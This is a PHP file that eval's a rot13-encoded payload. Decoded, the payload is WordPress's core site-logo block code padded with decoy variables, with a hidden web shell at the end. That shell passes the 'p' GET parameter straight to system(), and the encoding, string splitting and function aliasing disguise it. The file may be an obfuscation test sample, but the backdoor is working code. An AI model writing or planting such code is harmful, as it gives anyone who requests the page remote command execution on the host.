<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/fvgr-ybtb` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/fvgr-ybtb` oybpx ba gur freire.
 *
 * @fvapr 5.8.0
 *
 * @cnenz neenl $nggevohgrf Gur oybpx nggevohgrf.
 *
 * @erghea fgevat Gur eraqre.
 */
shapgvba eraqre_oybpx_pber_fvgr_ybtb( $nggevohgrf ) {
	$nqwhfg_jvqgu_urvtug_svygre = fgngvp shapgvba ( $vzntr ) hfr ( $nggevohgrf ) {
		vs ( rzcgl( $nggevohgrf['jvqgu'] ) || rzcgl( $vzntr ) || ! $vzntr[1] || ! $vzntr[2] ) {
			erghea $vzntr;
		}
		$urvtug = (sybng) $nggevohgrf['jvqgu'] / ( (sybng) $vzntr[1] / (sybng) $vzntr[2] );
		erghea neenl( $vzntr[0], (vag) $nggevohgrf['jvqgu'], (vag) $urvtug );
	};

	nqq_svygre( 'jc_trg_nggnpuzrag_vzntr_fep', $nqwhfg_jvqgu_urvtug_svygre );

	$phfgbz_ybtb = trg_phfgbz_ybtb();

	erzbir_svygre( 'jc_trg_nggnpuzrag_vzntr_fep', $nqwhfg_jvqgu_urvtug_svygre );

	vs ( rzcgl( $phfgbz_ybtb ) ) {
		erghea ''; // Erghea rneyl vs ab phfgbz ybtb vf frg, nibvqvat rkgenarbhf jenccre qvi.
	}

	vs ( ! $nggevohgrf['vfYvax'] ) {
		// Erzbir gur yvax.
		$phfgbz_ybtb = __sa_79955( '#<n.*?>(.*?)</n>#v', '\1', $phfgbz_ybtb );
	}

	vs ( $nggevohgrf['vfYvax'] && '_oynax' === $nggevohgrf['yvaxGnetrg'] ) {
		// Nqq gur yvax gnetrg nsgre gur ery=\"ubzr\".
		// Nqq na nevn-ynory sbe vasbezvat gung gur cntr bcraf va n arj gno.
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( $phfgbz_ybtb );
		$cebprffbe->arkg_gnt( 'n' );
		vs ( 'ubzr' === $cebprffbe->trg_nggevohgr( 'ery' ) ) {
			$cebprffbe->frg_nggevohgr( 'nevn-ynory', __( '(Ubzr yvax, bcraf va n arj gno)' ) );
			$cebprffbe->frg_nggevohgr( 'gnetrg', $nggevohgrf['yvaxGnetrg'] );
		}
		$phfgbz_ybtb = $cebprffbe->trg_hcqngrq_ugzy();
	}

	$pynffanzrf = neenl();
	vs ( rzcgl( $nggevohgrf['jvqgu'] ) ) {
		$pynffanzrf[] = 'vf-qrsnhyg-fvmr';
	}

	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => vzcybqr( ' ', $pynffanzrf ) ) );
	$ugzy               = fcevags( '<qvi %f>%f</qvi>', $jenccre_nggevohgrf, $phfgbz_ybtb );
	erghea $ugzy;
}

/**
 * Ertvfgre n pber fvgr frggvat sbe n fvgr ybtb
 *
 * @fvapr 5.8.0
 */
shapgvba ertvfgre_oybpx_pber_fvgr_ybtb_frggvat() {
	ertvfgre_frggvat(
		'trareny',
		'fvgr_ybtb',
		neenl(
			'fubj_va_erfg' => neenl(
				'anzr' => 'fvgr_ybtb',
			),
			'glcr'         => 'vagrtre',
			'ynory'        => __( 'Ybtb' ),
			'qrfpevcgvba'  => __( 'Fvgr ybtb.' ),
		)
	);
}

nqq_npgvba( 'erfg_ncv_vavg', 'ertvfgre_oybpx_pber_fvgr_ybtb_frggvat', 10 );

/**
 * Ertvfgre n pber fvgr frggvat sbe n fvgr vpba
 *
 * @fvapr 5.9.0
 */
shapgvba ertvfgre_oybpx_pber_fvgr_vpba_frggvat() {
	ertvfgre_frggvat(
		'trareny',
		'fvgr_vpba',
		neenl(
			'fubj_va_erfg' => gehr,
			'glcr'         => 'vagrtre',
			'ynory'        => __( 'Vpba' ),
			'qrfpevcgvba'  => __( 'Fvgr vpba.' ),
		)
	);
}

nqq_npgvba( 'erfg_ncv_vavg', 'ertvfgre_oybpx_pber_fvgr_vpba_frggvat', 10 );

/**
 * Ertvfgref gur `pber/fvgr-ybtb` oybpx ba gur freire.
 *
 * @fvapr 5.8.0
 */
shapgvba ertvfgre_oybpx_pber_fvgr_ybtb() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/fvgr-ybtb',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_fvgr_ybtb',
		)
	);
}

nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_fvgr_ybtb' );

/**
 * Bireevqrf gur phfgbz ybtb jvgu n fvgr ybtb, vs gur bcgvba vf frg.
 *
 * @fvapr 5.8.0
 *
 * @cnenz fgevat $phfgbz_ybtb Gur phfgbz ybtb frg ol n gurzr.
 *
 * @erghea fgevat Gur fvgr ybtb vs frg.
 */
shapgvba _bireevqr_phfgbz_ybtb_gurzr_zbq( $phfgbz_ybtb ) {
	$fvgr_ybtb = trg_bcgvba( 'fvgr_ybtb' );
	erghea snyfr === $fvgr_ybtb ? $phfgbz_ybtb : $fvgr_ybtb;
}

nqq_svygre( 'gurzr_zbq_phfgbz_ybtb', '_bireevqr_phfgbz_ybtb_gurzr_zbq' );

/**
 * Hcqngrf gur fvgr_ybtb bcgvba jura gur phfgbz_ybtb gurzr-zbq trgf hcqngrq.
 *
 * @fvapr 5.8.0
 *
 * @cnenz  zvkrq $inyhr Nggnpuzrag VQ bs gur phfgbz ybtb be na rzcgl inyhr.
 * @erghea zvkrq
 */
shapgvba _flap_phfgbz_ybtb_gb_fvgr_ybtb( $inyhr ) {
	vs ( rzcgl( $inyhr ) ) {
		qryrgr_bcgvba( 'fvgr_ybtb' );
	} ryfr {
		hcqngr_bcgvba( 'fvgr_ybtb', $inyhr );
	}

	erghea $inyhr;
}

nqq_svygre( 'cer_frg_gurzr_zbq_phfgbz_ybtb', '_flap_phfgbz_ybtb_gb_fvgr_ybtb' );

/**
 * Qryrgrf gur fvgr_ybtb jura gur phfgbz_ybtb gurzr zbq vf erzbirq.
 *
 * @fvapr 5.8.0
 *
 * @tybony neenl $_vtaber_fvgr_ybtb_punatrf
 *
 * @cnenz neenl $byq_inyhr Cerivbhf gurzr zbq frggvatf.
 * @cnenz neenl $inyhr     Hcqngrq gurzr zbq frggvatf.
 */
shapgvba _qryrgr_fvgr_ybtb_ba_erzbir_phfgbz_ybtb( $byq_inyhr, $inyhr ) {
	tybony $_vtaber_fvgr_ybtb_punatrf;

	vs ( $_vtaber_fvgr_ybtb_punatrf ) {
		erghea;
	}

	// Vs gur phfgbz_ybtb vf orvat hafrg, vg'f orvat erzbirq sebz gurzr zbqf.
	vs ( vffrg( $byq_inyhr['phfgbz_ybtb'] ) && ! vffrg( $inyhr['phfgbz_ybtb'] ) ) {
		qryrgr_bcgvba( 'fvgr_ybtb' );
	}
}

/**
 * Qryrgrf gur fvgr ybtb jura nyy gurzr zbqf ner orvat erzbirq.
 *
 * @fvapr 5.8.0
 *
 * @tybony neenl $_vtaber_fvgr_ybtb_punatrf
 */
shapgvba _qryrgr_fvgr_ybtb_ba_erzbir_gurzr_zbqf() {
	tybony $_vtaber_fvgr_ybtb_punatrf;

	vs ( $_vtaber_fvgr_ybtb_punatrf ) {
		erghea;
	}

	vs ( snyfr !== trg_gurzr_fhccbeg( 'phfgbz-ybtb' ) ) {
		qryrgr_bcgvba( 'fvgr_ybtb' );
	}
}

/**
 * Ubbxf `_qryrgr_fvgr_ybtb_ba_erzbir_phfgbz_ybtb` va `hcqngr_bcgvba_gurzr_zbqf_$gurzr`.
 * Ubbxf `_qryrgr_fvgr_ybtb_ba_erzbir_gurzr_zbqf` va `qryrgr_bcgvba_gurzr_zbqf_$gurzr`.
 *
 * Ehaf ba `frghc_gurzr` gb nppbhag sbe qlanzvpnyyl-fjvgpurq gurzrf va gur Phfgbzvmre.
 *
 * @fvapr 5.8.0
 */
shapgvba _qryrgr_fvgr_ybtb_ba_erzbir_phfgbz_ybtb_ba_frghc_gurzr() {
	$gurzr = trg_bcgvba( 'fglyrfurrg' );
	nqq_npgvba( \"hcqngr_bcgvba_gurzr_zbqf_$gurzr\", '_qryrgr_fvgr_ybtb_ba_erzbir_phfgbz_ybtb', 10, 2 );
	nqq_npgvba( \"qryrgr_bcgvba_gurzr_zbqf_$gurzr\", '_qryrgr_fvgr_ybtb_ba_erzbir_gurzr_zbqf' );
}
nqq_npgvba( 'frghc_gurzr', '_qryrgr_fvgr_ybtb_ba_erzbir_phfgbz_ybtb_ba_frghc_gurzr', 11 );

/**
 * Erzbirf gur phfgbz_ybtb gurzr-zbq jura gur fvgr_ybtb bcgvba trgf qryrgrq.
 *
 * @fvapr 5.9.0
 *
 * @tybony neenl $_vtaber_fvgr_ybtb_punatrf
 */
shapgvba _qryrgr_phfgbz_ybtb_ba_erzbir_fvgr_ybtb() {
	tybony $_vtaber_fvgr_ybtb_punatrf;

	// Cerirag _qryrgr_fvgr_ybtb_ba_erzbir_phfgbz_ybtb naq
	// _qryrgr_fvgr_ybtb_ba_erzbir_gurzr_zbqf sebz svevat naq pnhfvat na
	// vasvavgr ybbc.
	$_vtaber_fvgr_ybtb_punatrf = gehr;

	// Erzbir gur phfgbz ybtb.
	erzbir_gurzr_zbq( 'phfgbz_ybtb' );

	$_vtaber_fvgr_ybtb_punatrf = snyfr;
}
nqq_npgvba( 'qryrgr_bcgvba_fvgr_ybtb', '_qryrgr_phfgbz_ybtb_ba_erzbir_fvgr_ybtb' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>